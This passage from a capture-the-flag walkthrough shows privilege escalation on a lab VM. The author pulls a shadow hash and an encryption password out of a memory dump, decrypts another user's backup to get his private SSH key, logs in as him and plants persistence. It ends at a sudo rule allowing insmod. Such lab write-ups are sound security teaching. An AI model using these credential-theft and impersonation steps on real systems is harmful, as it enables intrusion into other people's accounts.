<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>polito@xerxes2:~<span class="nv">$ </span>strings output.bin <span class="p">|</span> grep korenchkin
</span><span class='line'>korenchkin.tar.enc
</span><span class='line'>cat /home/korenchkin/.ssh/id_rsa
</span><span class='line'>/home/korenchkin/.ssh/id_rsa
</span><span class='line'>korenchkin.lock.xerxes2.trioptimum.538a05e1.00000a80
</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWVtc1RjGcaeVDhmqvN/zQ+T2SoC2fHy+XTAq0HreospZLmKKW/oMeBuKmSJtWaELLqd92c5DVATacYJKbKLwgpGvkXenr7NRIJsLXIs5JVqOVyEt5BSsd0JfNAyK1cfLF2u6/5qcz3OG2R96zUdoXxyHWh1IGc38NUA+NsoBIcola1Y0tlXoYoA8s+RTk/1vn8PMG5NtEs5BklASSXL2fmUnb0QSg7g9G1XbyTucrixSXa+MLRbTfyVuqXHyfuVJwqWmg36kPQSuZJRBeFwlWLqim28tZd8iaL+J16MAv0zEUomo54Z5i2IPCJxbU1knwHy7yiJERJqmqaHaigI9/ korenchkin@xerxes2
</span><span class='line'><span class="m">1000</span>      <span class="m">2905</span>  0.0  1.1   <span class="m">9268</span>  <span class="m">1480</span> ?        S    12:43   0:00 sshd: korenchkin@pts/0
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'>_pammodutil_getpwnam_korenchkin_3
</span><span class='line'>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>-UN*X-FAIL-korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
</span><span class='line'>cat /var/mail/korenchkin
</span><span class='line'>_pammodutil_getpwnam_korenchkin_2
</span><span class='line'>korenchkin
</span><span class='line'>_pammodutil_getpwnam_korenchkin_1
</span><span class='line'>_pammodutil_getspnam_korenchkin_1
</span><span class='line'>_pammodutil_getspnam_korenchkin_0
</span><span class='line'>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'><span class="m">31</span> 12:46:08 sshd<span class="o">[</span>2506<span class="o">]</span>: pam_unix<span class="o">(</span>sshd:session<span class="o">)</span>: session opened <span class="k">for</span> user korenchkin by <span class="o">(</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">)</span>
</span><span class='line'><span class="m">31</span> 12:46:08 sshd<span class="o">[</span>2506<span class="o">]</span>: pam_unix<span class="o">(</span>sshd:session<span class="o">)</span>: session opened <span class="k">for</span> user korenchkin by <span class="o">(</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">)</span>
</span><span class='line'>korenchkin
</span><span class='line'>korenchkin:<span class="nv">$6$WjgI1TzN$u8gOd9v8jR2ffDGWGOwtxc58yczo5fsZy40TM84pct</span>.iSmlwRA4yV3.tdPnn5b8AWiQ.tnqUeInSQqkVEI2z3.:16221:0:99999:7:::
</span><span class='line'>May <span class="m">31</span> 12:41:48 xerxes2 sshd<span class="o">[</span>2749<span class="o">]</span>: Accepted password <span class="k">for</span> korenchkin from 172.16.32.1 port <span class="m">33385</span> ssh2
</span><span class='line'>May <span class="m">31</span> 12:41:48 xerxes2 sshd<span class="o">[</span>2749<span class="o">]</span>: pam_unix<span class="o">(</span>sshd:session<span class="o">)</span>: session opened <span class="k">for</span> user korenchkin by <span class="o">(</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">)</span>
</span><span class='line'>May <span class="m">31</span> 12:43:40 xerxes2 sshd<span class="o">[</span>2903<span class="o">]</span>: Accepted password <span class="k">for</span> korenchkin from 172.16.32.1 port <span class="m">33398</span> ssh2
</span><span class='line'>May <span class="m">31</span> 12:43:40 xerxes2 sshd<span class="o">[</span>2903<span class="o">]</span>: pam_unix<span class="o">(</span>sshd:session<span class="o">)</span>: session opened <span class="k">for</span> user korenchkin by <span class="o">(</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">)</span>
</span><span class='line'>May <span class="m">31</span> 12:46:08 xerxes2 sshd<span class="o">[</span>2506<span class="o">]</span>: Accepted password <span class="k">for</span> korenchkin from 172.16.32.1 port <span class="m">33414</span> ssh2
</span><span class='line'>May <span class="m">31</span> 12:46:08 xerxes2 sshd<span class="o">[</span>2506<span class="o">]</span>: pam_unix<span class="o">(</span>sshd:session<span class="o">)</span>: session opened <span class="k">for</span> user korenchkin by <span class="o">(</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">)</span>
</span><span class='line'>ts/0korenchkin
</span><span class='line'>korenchkin:x:1000:1000:Anatoly Korenchkin,,,:/home/korenchkin:/bin/bash
</span><span class='line'>ts/0korenchkin
</span><span class='line'>sshd: korenchkin <span class="o">[</span>priv<span class="o">]</span>
</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWVtc1RjGcaeVDhmqvN/zQ+T2SoC2fHy+XTAq0HreospZLmKKW/oMeBuKmSJtWaELLqd92c5DVATacYJKbKLwgpGvkXenr7NRIJsLXIs5JVqOVyEt5BSsd0JfNAyK1cfLF2u6/5qcz3OG2R96zUdoXxyHWh1IGc38NUA+NsoBIcola1Y0tlXoYoA8s+RTk/1vn8PMG5NtEs5BklASSXL2fmUnb0QSg7g9G1XbyTucrixSXa+MLRbTfyVuqXHyfuVJwqWmg36kPQSuZJRBeFwlWLqim28tZd8iaL+J16MAv0zEUomo54Z5i2IPCJxbU1knwHy7yiJERJqmqaHaigI9/ korenchkin@xerxes2
</span><span class='line'>_pammodutil_getpwnam_korenchkin_0
</span><span class='line'>sshd: korenchkin@pts/0
</span><span class='line'>/home/korenchkin/.bash_history
</span><span class='line'>sshd: korenchkin
</span><span class='line'>sshd: korenchkin@pts/0
</span><span class='line'>_pammodutil_getpwnam_korenchkin_0
</span><span class='line'>cat /var/mail/korenchkin
</span><span class='line'>tar -cvf /opt/backup/korenchkin.tar ~/
</span><span class='line'>openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
</span><span class='line'>rm /opt/backup/korenchkin.tar
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>root: korenchkin
</span><span class='line'>sshd: korenchkin@pts/0
</span><span class='line'>korenchkin.l
</span><span class='line'>korenchkin.lock.xerxes2.trioptimum.538a0745.00000995
</span><span class='line'>korenchkin.lock
</span><span class='line'>ome/korenchkin
</span><span class='line'>cat /home/korenchkin/.ssh/id_rsa
</span><span class='line'>/home/korenchkin/.ssh/id_rsa
</span><span class='line'>korenchkin.lock.xerxes2.trioptimum.538a05e1.00000a80
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'>sshd: korenchkin <span class="o">[</span>priv<span class="o">]</span>
</span><span class='line'>_pammodutil_getpwnam_korenchkin_0
</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWVtc1RjGcaeVDhmqvN/zQ+T2SoC2fHy+XTAq0HreospZLmKKW/oMeBuKmSJtWaELLqd92c5DVATacYJKbKLwgpGvkXenr7NRIJsLXIs5JVqOVyEt5BSsd0JfNAyK1cfLF2u6/5qcz3OG2R96zUdoXxyHWh1IGc38NUA+NsoBIcola1Y0tlXoYoA8s+RTk/1vn8PMG5NtEs5BklASSXL2fmUnb0QSg7g9G1XbyTucrixSXa+MLRbTfyVuqXHyfuVJwqWmg36kPQSuZJRBeFwlWLqim28tZd8iaL+J16MAv0zEUomo54Z5i2IPCJxbU1knwHy7yiJERJqmqaHaigI9/ korenchkin@xerxes2
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'>korenchkin.lock.xerxes2.trioptimum.538a0745.00000995
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>.32.1
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>.32.1
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'>ts/0korenchkin
</span><span class='line'>2014-05-31 12:45:57 1WqmPt-0000dB-Bi <span class="o">=</span>&gt; korenchkin &lt;root@xerxes2.trioptimum&gt; <span class="nv">R</span><span class="o">=</span>local_user <span class="nv">T</span><span class="o">=</span>mail_spool
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@x
</span><span class='line'>korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>korenchkin.lock
</span><span class='line'>korenchkin
</span><span class='line'>korenchkin.lock.xerxes2.trioptimum.538a0745.00000995
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>_pammodutil_getpwnam_korenchkin_1
</span><span class='line'>_pammodutil_getspnam_korenchkin_1
</span><span class='line'>_pammodutil_getspnam_korenchkin_0
</span><span class='line'>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>-UN*X-FAIL-korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>tar -cvf /opt/backup/korenchkin.tar ~/
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'>rm /opt/backup/korenchkin.tar
</span><span class='line'>korenchkin.lock.xerxes2.trioptimum.538a05e1.00000a80
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'>_pammodutil_getpwnam_korenchkin_2
</span><span class='line'>korenchkin
</span><span class='line'>sshd: korenchkin@pts/0
</span><span class='line'>root: korenchkin
</span><span class='line'>korenchkin.l
</span><span class='line'>korenchkin.lock.xerxes2.trioptimum.538a0745.00000995
</span><span class='line'>korenchkin.lock
</span><span class='line'>korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>ts/0korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>n
</span><span class='line'>_pammodutil_getpwnam_korenchkin_3
</span><span class='line'>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>ts/0korenchkin
</span><span class='line'>cat /var/mail/korenchkin
</span><span class='line'>tar -cvf /opt/backup/korenchkin.tar ~/
</span><span class='line'>openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
</span><span class='line'>rm /opt/backup/korenchkin.tar
</span><span class='line'>/home/korenchkin0
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>6MMMMb<span class="se">\ </span> 6MMMMb
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@x
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>.32.1
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'>/home/korenchkin/.terminfo
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>6MMMMb<span class="se">\ </span> 6MMMMb
</span><span class='line'>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'><span class="nv">USER</span><span class="o">=</span>korenchkin
</span><span class='line'><span class="nv">MAIL</span><span class="o">=</span>/var/mail/korenchkin
</span><span class='line'><span class="nv">PWD</span><span class="o">=</span>/home/korenchkin
</span><span class='line'><span class="nv">PWD</span><span class="o">=</span>/home/korenchkin
</span><span class='line'><span class="nv">HOME</span><span class="o">=</span>/home/korenchkin
</span><span class='line'><span class="nv">LOGNAME</span><span class="o">=</span>korenchkin
</span><span class='line'>/var/mail/korenchkin
</span><span class='line'><span class="nv">USER</span><span class="o">=</span>korenchkin
</span><span class='line'><span class="nv">LOGNAME</span><span class="o">=</span>korenchkin
</span><span class='line'><span class="nv">HOME</span><span class="o">=</span>/home/korenchkin
</span><span class='line'><span class="nv">MAIL</span><span class="o">=</span>/var/mail/korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'><span class="o">]</span>0<span class="p">;</span>korenchkin@xerxes2: ~
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span><span class='line'><span class="nv">HOME</span><span class="o">=</span>/home/korenchkin
</span><span class='line'>/var/mail/korenchkin
</span><span class='line'><span class="nv">MAIL</span><span class="o">=</span>/var/mail/korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>korenchkin
</span><span class='line'><span class="nv">USER</span><span class="o">=</span>korenchkin
</span><span class='line'>korenchkin
</span><span class='line'><span class="nv">LOGNAME</span><span class="o">=</span>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>_pammodutil_getpwnam_korenchkin_1
</span><span class='line'>_pammodutil_getspnam_korenchkin_1
</span><span class='line'>_pammodutil_getspnam_korenchkin_0
</span><span class='line'>korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>-UN*X-FAIL-korenchkin
</span><span class='line'>/home/korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>korenchkin
</span><span class='line'>polito@xerxes2:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s more workable - but wait, what&rsquo;s that&hellip; a tarball encrypted into /opt/backup/ ?</p>

<p><img src="http://1.bp.blogspot.com/_pS7sKjlzwFg/TOMG_De_jfI/AAAAAAAAGX4/XfN7NH07GiA/s320/quagmire_jackpot.gif" alt="" /></p>

<p>OpenSSL can be used to decrypt the file to get the original tarball.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>polito@xerxes2:~<span class="nv">$ </span>openssl aes-256-cbc -d -salt -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out /home/polito/korenchkin/korenchkin.tar
</span><span class='line'>polito@xerxes2:~<span class="nv">$ </span>ls -l korenchkin/
</span><span class='line'>total 12
</span><span class='line'>-rw-r--r-- <span class="m">1</span> polito polito <span class="m">10240</span> Aug  <span class="m">8</span> 12:05 korenchkin.tar
</span><span class='line'>polito@xerxes2:~<span class="nv">$ </span><span class="nb">cd </span>korenchkin/
</span><span class='line'>polito@xerxes2:~/korenchkin<span class="nv">$ </span>tar xvf korenchkin.tar
</span><span class='line'>.ssh/id_rsa
</span><span class='line'>.ssh/id_rsa.pub
</span><span class='line'>polito@xerxes2:~/korenchkin<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Looks like Korenchkin is sensible and backs up his keypair&hellip; but now I have it, so user impersonation is possible.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>polito@xerxes2:~/korenchkin<span class="nv">$ </span>ssh -i .ssh/id_rsa korenchkin@127.0.0.1
</span><span class='line'>The authenticity of host <span class="s1">&#39;127.0.0.1 (127.0.0.1)&#39;</span> can<span class="s1">&#39;t be established.</span>
</span><span class='line'><span class="s1">ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84.</span>
</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span>127.0.0.1<span class="s1">&#39; (ECDSA) to the list of known hosts.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">Welcome to xerxes2.</span>
</span><span class='line'><span class="s1">      XERXES wishes you</span>
</span><span class='line'><span class="s1">       a pleasant stay.</span>
</span><span class='line'><span class="s1">____   ___  ____  ___  __ ____   ___  ____     ____     ____   </span>
</span><span class='line'><span class="s1">`MM(   )P&#39;</span> 6MMMMb <span class="sb">`</span>MM 6MM <span class="sb">`</span>MM<span class="o">(</span>   <span class="o">)</span>P<span class="s1">&#39; 6MMMMb   6MMMMb\  6MMMMb  </span>
</span><span class='line'><span class="s1"> `MM` ,P  6M&#39;</span>  <span class="sb">`</span>Mb MM69 <span class="err">&quot;</span>  <span class="sb">`</span>MM<span class="sb">`</span> ,P  6M<span class="s1">&#39;  `Mb MM&#39;</span>    <span class="sb">`</span> MM<span class="s1">&#39;  `Mb </span>
</span><span class='line'><span class="s1">  `MM,P   MM    MM MM&#39;</span>      <span class="sb">`</span>MM,P   MM    MM YM.           ,MM
</span><span class='line'>   <span class="sb">`</span>MM.   MMMMMMMM MM        <span class="sb">`</span>MM.   MMMMMMMM  YMMMMb      ,MM<span class="s1">&#39; </span>
</span><span class='line'><span class="s1">   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M&#39;</span>
</span><span class='line'>  d<span class="s1">&#39; `MM. YM    d9 MM       d&#39;</span> <span class="sb">`</span>MM. YM    d9 L    ,MM ,M<span class="err">&#39;</span>
</span><span class='line'>_d_  _<span class="o">)</span>MM_ YMMMM9 _MM_    _d_  _<span class="o">)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM
</span><span class='line'>
</span><span class='line'>You have new mail.
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>korenchkin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>korenchkin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>korenchkin<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Once again, my public key is echo&rsquo;d into .ssh/authorized_keys, and I am able to SSH in from my client.</p>

<hr />

<h2>Holding the Con with Anatoly</h2>

<p><img src="http://img1.wikia.nocookie.net/__cb20120107145214/shodan/images/e/e1/Korenchkin.png" alt="" /></p>

<p>With great power comes great responsibility.  This is <a href="http://shodan.wikia.com/wiki/Anatoly_Korenchkin">Anatoly Korenchkin</a>.</p>

<p>Korenchkin must be able to do some important stuff - after all he worked alongside the captain of the Von Braun. Turns out my suspicion was correct</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>sudo -l
</span><span class='line'>Matching Defaults entries <span class="k">for</span> korenchkin on this host:
</span><span class='line'>    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span><span class='line'>
</span><span class='line'>User korenchkin may run the following commands on this host:
</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /sbin/insmod, <span class="o">(</span>root<span class="o">)</span> /sbin/rmmod
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


